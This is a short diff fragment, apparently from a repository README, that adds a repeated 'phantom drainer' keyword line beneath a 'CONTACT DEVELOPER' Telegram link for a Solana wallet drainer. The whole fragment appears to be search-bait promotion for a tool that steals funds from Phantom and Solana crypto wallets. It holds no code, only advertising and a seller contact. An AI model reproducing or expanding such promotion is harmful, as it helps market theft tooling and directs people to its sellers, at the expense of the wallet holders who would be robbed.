@@ -36,3 +36,4 @@ CONTACT DEVELOPER - https://t.me/solana_drain_wallet
 # phantom drainer
 # solana wallet drainer
 # solana crypto drainer
+# phantom drainer
